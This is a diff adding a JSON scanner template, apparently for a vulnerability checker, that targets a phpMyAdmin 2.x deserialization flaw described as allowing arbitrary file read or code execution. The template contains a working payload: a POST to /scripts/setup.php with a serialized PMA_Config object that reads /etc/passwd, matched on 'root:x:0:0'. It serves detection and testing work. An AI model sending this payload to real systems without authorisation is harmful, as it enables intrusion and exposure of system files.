@@ -1,0 +1,23 @@
+{
+  "cms": "phpmyadmin",
+  "version": "",
+  "author": "wolf",
+  "desc": "phpmyadmin 2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。",
+  "tags": [
+    "RCE"
+  ],
+  "refer": [
+    "https://github.com/vulhub/vulhub/blob/master/phpmyadmin/WooYun-2016-199433/README.zh-cn.md",
+    ""
+  ],
+  "request": {
+    "path": "/scripts/setup.php",
+    "method": "POST",
+    "parameter": "action=test&configuration=O:10:\"PMA_Config\":1:{s:6:\"source\",s:11:\"/etc/passwd\";}"
+  },
+  "response": {
+    "position": "body",
+    "regex": false,
+    "match": "root:x:0:0"
+  }
+}
